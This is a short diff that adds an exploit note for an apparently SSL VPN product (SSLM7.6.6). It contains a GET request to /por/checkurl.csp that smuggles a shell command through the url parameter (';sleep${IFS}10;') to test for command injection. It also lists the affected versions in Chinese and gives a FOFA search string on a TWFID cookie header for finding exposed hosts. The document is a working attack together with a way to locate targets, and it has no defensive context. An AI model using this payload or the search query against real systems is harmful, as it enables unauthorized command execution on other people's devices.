@@ -1,0 +1,8 @@
+GET  /por/checkurl.csp?url=http://127.0.0.1;sleep${IFS}10;&retry=0&timeout=1 HTTP/1.1
+
+影响范围:
+SSLM7.6.6(20181120)
+SSLM7.6.6R1(20181225)
+
+
+fofa搜索：header="Set-Cookie: TWFID="
